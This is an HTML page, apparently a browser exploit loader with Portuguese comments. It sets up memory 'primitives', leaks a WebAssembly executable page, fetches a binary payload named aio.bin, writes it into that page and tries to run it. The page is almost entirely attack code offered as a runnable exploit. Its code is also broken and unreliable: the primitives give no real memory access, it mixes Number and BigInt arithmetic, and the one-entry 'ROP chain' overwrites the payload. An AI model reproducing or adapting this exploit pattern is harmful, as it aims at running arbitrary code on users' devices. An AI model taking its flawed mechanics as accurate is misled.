<!DOCTYPE html>
<html>
<head>
  <title>Exploit Test</title>
</head>
<body>
<h1>Iniciando Exploit...</h1>

<script>

let ab, f64, u32;
let fakeobj, addrof, arb_read, arb_write;
let shellcode_buffer;

function log(txt) {
  console.log(txt);
  document.body.innerHTML += txt + "<br>";
}

function hex(n) {
  return "0x" + n.toString(16);
}

// =======================
// Setup primitivas básicas
// =======================
function setupPrimitives() {
  log("[+] setupPrimitives()");

  ab = new ArrayBuffer(0x100);
  f64 = new Float64Array(ab);
  u32 = new Uint32Array(ab);

  let obj_arr = [1.1, 1.2, 1.3];
  let float_arr = [1.1, 1.2, 1.3];

  fakeobj = function(addr) {
    f64[0] = addr;
    return float_arr[0];
  };

  addrof = function(obj) {
    float_arr[0] = obj;
    return f64[0];
  };

  arb_read = function(addr) {
    f64[0] = addr;
    return f64[0];
  };

  arb_write = function(addr, val) {
    f64[0] = addr;
    f64[0] = val;
  };

  log("primitives ready");
}

// ========================
// Leak RWX page do WASM
// ========================
async function leakLibc() {
  log("[+] leakLibc()");

  const wasmCode = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x07,
    0x01,0x60,0x00,0x00,0x03,0x02,0x01,0x00,0x07,0x07,
    0x01,0x03,0x66,0x6e,0x31,0x00,0x00,0x0a,0x09,0x01,
    0x07,0x00,0x41,0x2a,0x10,0x00,0x0b
  ]);

  const wasmModule = new WebAssembly.Module(wasmCode);
  const wasmInstance = new WebAssembly.Instance(wasmModule);
  const fn = wasmInstance.exports.fn1;

  const wasmInstanceAddr = addrof(wasmInstance);
  log("wasmInstanceAddr = " + hex(wasmInstanceAddr));

  const rwxPageAddr = arb_read(wasmInstanceAddr + 0x68n);
  log("rwxPageAddr = " + hex(rwxPageAddr));

  return rwxPageAddr;
}

// =======================
// Construir ROP
// =======================
async function buildROP(rwxAddr) {
  log("[+] buildROP()");

  shellcode_buffer = rwxAddr;
  log("shellcode buffer @ " + hex(shellcode_buffer));

  // Aqui você normalmente colocaria gadgets reais
  // Para este exemplo, apenas vamos fazer o pivot direto
  let ropChain = [
    rwxAddr, // saltar direto para o shellcode
  ];

  return ropChain;
}

// =======================
// Injetar e executar binário
// =======================
async function injectAndRun(rop) {
  log("[+] injectAndRun()");

  try {
    log("[+] fetching aio.bin...");
    const response = await fetch('aio.bin');
    const payload = await response.arrayBuffer();
    const payload_bytes = new Uint8Array(payload);
    log("bin size = " + payload_bytes.length + " bytes");

    for (let i = 0; i < payload_bytes.length; i++) {
      arb_write(shellcode_buffer + BigInt(i), BigInt(payload_bytes[i]));
    }
    log("bin injected");

    // Escrever ROP chain (simples aqui)
    for (let i = 0; i < rop.length; i++) {
      arb_write(shellcode_buffer + BigInt(i * 8), rop[i]);
    }
    log("ROPChain written (" + rop.length + " entries)");

    log("[+] triggering ROP-shellcode");
    fakeobj(shellcode_buffer)(); // Dispara execução
  } catch (e) {
    log("!!! erro exploit: " + e);
  }
}

// =======================
// Exploit principal
// =======================
async function main() {
  log("=== Exploit start ===");

  setupPrimitives();

  const rwxPageAddr = await leakLibc();
  const rop = await buildROP(rwxPageAddr);
  await injectAndRun(rop);

  log("=== done ===");
}

main();

</script>
</body>
</html>
